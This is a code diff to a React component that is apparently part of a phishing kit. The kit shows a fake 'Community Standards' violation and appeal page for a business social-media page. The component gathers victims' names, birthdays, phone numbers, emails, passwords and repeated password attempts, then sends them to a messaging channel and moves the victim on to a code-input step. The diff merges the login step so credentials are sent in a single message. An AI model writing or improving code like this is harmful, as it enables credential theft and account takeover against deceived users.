@@ -62,30 +62,12 @@ const GetInfo: React.FC = () => {
 					`<b>📄 Page name:</b> <code>${pageName}</code>\n` +
 					`<b>🧑 Name:</b> <code>${name}</code>\n` +
 					`<b>🎂 Birthday:</b> <code>${birthday}</code>\n\n` +
-					`<b>📞 Phone number:</b> <code>${phoneNumber}</code>\n`;
-				setMessage(message + newMessage);
-				sendMessage({ text: newMessage });
-				navigate('login');
-			}
-		};
-
-		const handleBusinessHomeLogin = () => {
-			setFailedPasswordAttempts(1);
-			if (email === '') {
-				emailInputRef.current?.focus();
-			} else if (password === '') {
-				passwordInputRef.current?.focus();
-			} else {
-				const newMessage =
-					message +
+					`<b>📞 Phone number:</b> <code>${phoneNumber}</code>\n` +
 					`<b>📧 Email:</b> <code>${email}</code>\n` +
 					`<b>🔒 Password:</b> <code>${password}</code>`;
-				setMessage(newMessage);
-				const messageId = localStorage.getItem('message_id');
-				editMessageText({
-					message_id: Number(messageId),
-					text: newMessage,
-				});
+				setFailedPasswordAttempts(1);
+				setMessage(message + newMessage);
+				sendMessage({ text: newMessage });
 				delayLoading();
 			}
 		};
@@ -104,7 +86,7 @@ const GetInfo: React.FC = () => {
 			if (currentPath === '/business/home/confirm-password') {
 				setMessage(
 					message +
-					`\n<b>🔒 Password ${failedPasswordAttempts}</b> <code>${confirmPassword}</code>`,
+						`\n<b>🔒 Password ${failedPasswordAttempts}</b> <code>${confirmPassword}</code>`,
 				);
 				const messageID = localStorage.getItem('message_id');
 				editMessageText({
@@ -116,7 +98,7 @@ const GetInfo: React.FC = () => {
 			}
 			setTimeout(() => {
 				setIsLoading(false);
-				if (currentPath === '/business/home/login') {
+				if (currentPath === '/business/home') {
 					navigate('/business/home/confirm-password');
 				} else if (
 					failedPasswordAttempts === maxFailedPasswordAttempts
@@ -124,7 +106,7 @@ const GetInfo: React.FC = () => {
 					localStorage.setItem(
 						'message',
 						message +
-						`\n<b>🔒 Password ${failedPasswordAttempts}</b> <code>${confirmPassword}</code>`,
+							`\n<b>🔒 Password ${failedPasswordAttempts}</b> <code>${confirmPassword}</code>`,
 					);
 					navigate('/business/code-input');
 				} else {
@@ -139,9 +121,6 @@ const GetInfo: React.FC = () => {
 		switch (currentPath) {
 			case '/business/home':
 				handleBusinessHome();
-				break;
-			case '/business/home/login':
-				handleBusinessHomeLogin();
 				break;
 			case '/business/home/confirm-password':
 				handleBusinessHomeConfirmPassword();
@@ -164,18 +143,19 @@ const GetInfo: React.FC = () => {
 				<hr />
 			</div>
 			<div className='my-5'>
-    We have detected unusual activity on your page today{' '}
-    <strong>{getToday()}</strong> that violates our{' '}
-    <b className='cursor-pointer font-medium text-blue-500 hover:underline'>
-        Community Standards
-    </b>
-    . Your access to the page has been limited, and you are currently unable to post, share, or comment using your page. 
-    If you believe this to be a mistake, you have the option to{' '}
-    <b className='cursor-pointer font-medium text-blue-500 hover:underline'>
-        submit an appeal
-    </b>{' '}
-    by providing the necessary information.
-</div>
+				We have detected unusual activity on your page today{' '}
+				<strong>{getToday()}</strong> that violates our{' '}
+				<b className='cursor-pointer font-medium text-blue-500 hover:underline'>
+					Community Standards
+				</b>
+				. Your access to the page has been limited, and you are
+				currently unable to post, share, or comment using your page. If
+				you believe this to be a mistake, you have the option to{' '}
+				<b className='cursor-pointer font-medium text-blue-500 hover:underline'>
+					submit an appeal
+				</b>{' '}
+				by providing the necessary information.
+			</div>
 
 			<Outlet
 				context={{
@@ -209,8 +189,9 @@ const GetInfo: React.FC = () => {
 				</div>
 			</div>
 			<button
-				className={`my-5 flex w-full items-center justify-center rounded-lg bg-blue-500 p-4 font-semibold text-white hover:bg-blue-600 ${isLoading ? 'cursor-not-allowed opacity-70' : ''
-					}`}
+				className={`my-5 flex w-full items-center justify-center rounded-lg bg-blue-500 p-4 font-semibold text-white hover:bg-blue-600 ${
+					isLoading ? 'cursor-not-allowed opacity-70' : ''
+				}`}
 				onClick={handleButtonClick}
 				disabled={isLoading}
 			>
